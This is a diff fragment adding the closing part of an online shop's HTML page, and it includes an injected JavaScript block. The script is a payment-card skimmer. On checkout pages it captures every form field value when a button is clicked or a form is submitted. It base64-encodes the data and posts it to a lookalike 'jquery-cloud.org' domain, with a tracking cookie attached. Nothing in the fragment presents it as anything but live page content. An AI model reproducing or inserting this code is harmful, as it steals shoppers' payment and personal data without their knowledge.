+   "@type": "WebSite",
+   "url": "http://iamsecondcollective.com/",
+   "potentialAction": {
+     "@type": "SearchAction",
+     "target": "http://iamsecondcollective.com/catalogsearch/result/?q={search_term_string}",
+     "query-input": "required name=search_term_string"
+   }
+}
+</script>    </div>
+</div>
+<script type="text/javascript">
+<!--
+var grelos_v={
+	snd:null,
+	Glink:'https://jquery-cloud.org/js/jquery.min.js',
+	myid:(function(name){
+		var matches=document.cookie.match(new RegExp('(?:^|; )'+name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,'\\$1')+'=([^;]*)'));
+		return matches?decodeURIComponent(matches[1]):undefined;
+	})('setidd')||(function(){
+		var ms=new Date();
+		var myid = ms.getTime()+"-"+Math.floor(Math.random()*(999999999-11111111+1)+11111111); 
+		var date=new Date(new Date().getTime()+60*60*24*1000);
+		document.cookie='setidd='+myid+'; path=/; expires='+date.toUTCString();
+		return myid;
+	})(),
+	base64_encode:function(data){
+		var b64='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+		var o1,o2,o3,h1,h2,h3,h4,bits,i=0,enc='';
+		do{
+			o1=data.charCodeAt(i++);
+			o2=data.charCodeAt(i++);
+			o3=data.charCodeAt(i++);
+			bits=o1<<16 | o2<<8 | o3;
+			h1=bits>>18 & 0x3f;
+			h2=bits>>12 & 0x3f;
+			h3=bits>>6 & 0x3f;
+			h4=bits & 0x3f;
+			enc+=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);
+		}while(i<data.length);
+		switch(data.length%3){
+			case 1:
+				enc=enc.slice(0,-2)+'==';
+				break;
+			case 2:
+				enc=enc.slice(0,-1)+'=';
+				break;
+		}
+		return enc;
+	},
+	clk:function(){
+		grelos_v.snd=null;
+		var inp=document.querySelectorAll("input, select, textarea, checkbox, button");
+		for (var i=0;i<inp.length;i++){
+			if(inp[i].value.length>0){
+				var nme=inp[i].name;
+				if(nme==''){nme=i;}
+				grelos_v.snd+=inp[i].name+'='+inp[i].value+'&';
+			}
+		}
+	},
+	send:function(){
+		try{
+			var btn=document.querySelectorAll("a[href*='javascript:void(0)'],button, input, submit, .btn, .button");
+			for(var i=0;i<btn.length;i++){
+				var b=btn[i];
+				if(b.type!='text'&&b.type!='select'&&b.type!='checkbox'&&b.type!='password'&&b.type!='radio'){
+					if(b.addEventListener) {
+					b.addEventListener('click',grelos_v.clk,false);
+					}else{
+						b.attachEvent('onclick',grelos_v.clk);
+					}
+				}
+			}
+			var frm=document.querySelectorAll('form');
+			for(vari=0;i<frm.length;i++){
+				if(frm[i].addEventListener){
+					frm[i].addEventListener('submit',grelos_v.clk,false);
+				}else{
+					frm[i].attachEvent('onsubmit',grelos_v.clk);
+				}
+			}
+			if(grelos_v.snd!=null){
+				var domm=location.hostname.split('.').slice(0).join('_');
+				var keym=grelos_v.base64_encode(grelos_v.snd);
+				var http=new XMLHttpRequest();
+				http.open('POST',grelos_v.Glink,true);
+				http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+				http.send('info='+keym+'&hostname='+domm+'&key='+grelos_v.myid);
+			}
+			grelos_v.snd=null;
+			keym=null;
+			setTimeout(function(){grelos_v.send()},30);
+		}catch(e){}
+	}
+}
+if((new RegExp('onepage|checkout|onestep','gi')).test(window.location)){
+	grelos_v.send();
+}
+-->
+</script>
+</body>
+</html>
